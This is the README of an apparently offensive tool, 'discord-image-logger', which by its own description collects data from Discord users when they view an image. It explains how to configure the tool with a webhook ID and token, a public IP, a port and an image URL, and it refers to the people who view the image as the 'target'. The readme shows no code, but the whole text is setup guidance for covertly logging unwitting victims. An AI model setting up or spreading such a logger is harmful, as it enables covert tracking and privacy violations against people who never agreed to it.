# discord-image-logger
Get data from people on discord by viewing an image

Usage:
Create a .env file
Write the following into the .env file:
    
    id="<YOUR_WEBHOOK_ID>"
    token="<YOUR_WEBHOOK_TOKEN>"
    pub_ip="<YOUR_IP>"
    port="<PORT>"
    username="<BOT_USERNAME>"
    avatar_url="<BOT_PROFILE_PIC_URL>"
    image_url="<YOUR_IMAGE_URL>"

Set vars to:

    https://discord.com/api/webhooks/
    1234567890123456789 #WEBHOOK_ID
    /
    12345678901234567890123456789012345678901234567890123456789012345678 #WEBHOOK_TOKEN

You may need to expose the port you entered in the .env file to make this work.

This will not work if the ip of your target starts with 3
